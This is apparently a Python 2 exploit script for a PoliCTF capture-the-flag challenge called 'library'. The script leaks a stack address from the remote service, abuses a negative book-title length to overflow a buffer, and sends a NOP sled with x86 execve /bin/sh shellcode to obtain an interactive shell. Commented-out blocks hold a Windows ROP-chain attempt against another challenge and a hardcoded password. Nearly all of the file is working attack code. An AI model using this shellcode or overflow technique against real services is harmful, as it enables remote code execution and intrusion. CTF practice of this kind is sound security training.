__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
'''
sinh ra parameter cho app
./inbincible $(python -c "a='01101111080101100801101010110101'.decode('hex');print(a)")

dugn trong gdb
r  $(python -c "a='01101111080101100801101010110101'.decode('hex');print(a)")


'''
'''
 r - read from library
 a - add element
 u - exit
'''
# library.polictf.it 80
shellcode = "\x33\xd2\x33\xc9\x33\xdb"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+\
		    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

s = socket.create_connection(('library.polictf.it', 80))
#s = socket.create_connection(('192.168.19.26', 9446))
#raw_input()
print s.recv(10)
print recv_until(s, ' u - exit\n')
s.send('a\n')
print s.recv(len('Hey mate! Insert how long is the book title: '))
#print recv_until(s, 'book title: \n')

s.send('1000\n')
s.send('a'*1+'\n')

time.sleep(0.01)
print s.recv(100)
print recv_until(s, 'exit\n')
s.send('r\n')
print '================'
print recv_until(s, 'read: ')
s.send('1\n')

stack_leak = s.recv(8)
beauty_print(stack_leak)
stack_address = ui(stack_leak[0:4])
print 'stack address = {}'.format(hex(stack_address))

time.sleep(0.01)
print recv_until(s, 'exit\n')
s.send('a\n')
#print s.recv(len('Hey mate! Insert how long is the book title: '))
print recv_until(s, 'book title: \n')

s.send('-1000\n')
print 'Send shellcode ... '
s.send(30*pi(stack_address+300)+'\x90'*500+shellcode+'\n')

# exit

time.sleep(0.01)
print recv_until(s, 'exit\n')
s.send('u\n')
#print recv_until(s, 'bye!')
#print s.recv(10)

time.sleep(0.1)

s.send('ls -l\n')
print s.recv(1024)
final_interact()

'''
00000000: 34 3E E2 FF 3C 3E E2 FF  0D 61 5A F7 C4 A3 71 F7  4>..<>...aZ...q.
00000010: 20 0A                                              .
stack address = 0xffe23e34L

00000000: 34 7E BB FF 3C 7E BB FF  0D B1 5C F7 C4 F3 73 F7  4~..<~....\...s.
00000010: 20 0A                                              .
stack address = 0xffbb7e34L
'''
'''
rop = pi(0x7c87fbc0)+pi(0x11513275)+pi(0x7c8358d7)+pi(0x7c880242)+pi(0x004010D0)
#.rdata:    00402164     aXxxxxxxxxxxxxx db 'xxxxxxxxxxxxxxxxxx',0
#       11111111
#       11513275

def vet(address_base):
    i = 0
    #time.sleep(1)
    print '[+] loop ' + str(i)
    print recv_until(s, 'Enter your name : ')

    base_address = address_base
    print_flag_function1 = 0x1000+base_address
    send_address1 = 0x10C7+base_address
    return_after_print_flag1 = 0x1397+base_address

    #.text:004013B1 1D0                 push    esi             ; s
    #.text:004013B2 1D4                 call    send

    pw = 0x2164+base_address
    pw = pi(pw)
    return_add = pi(0x13B1+base_address)

    print_flag_function = pi(print_flag_function1)
    return_after_print_flag = pi(return_after_print_flag1)
    #sent_buffer = 'a'*100+return_add+pw+'\xFF'+'\x00'+'\n'
    temp=''
    #   pi(0x7c83c308)
    #	0x7c80bca8: pop esp ; ret  ;  (2 found) =>
	#   0x7c83c308: pop esp ; ret  ;  (1 found) => da thu ma ko dc

    # sent first
    # sent_buffer = temp+'\x90'*(100-len(temp))+pi(0x12fd24)+pi(0x00401000)+'\x6A\x00\xB0\x14\x50\x52\x56\x68\xD2\x10\x40\x00\xC3\x90\x90'+pi(0x004013AC)+'\x64\x01\x00\x00'+'\x00'*4+'\n'       # da chay duoc local
    # second send to get flag
    sent_buffer = 'WhiteHat_Bkav@2014\x00\n'
    s.send(sent_buffer)
    time.sleep(0.01)
    data = s.recv(1024)
    print data


vet(0x00400000)

#456e7465 b8fc1200
'''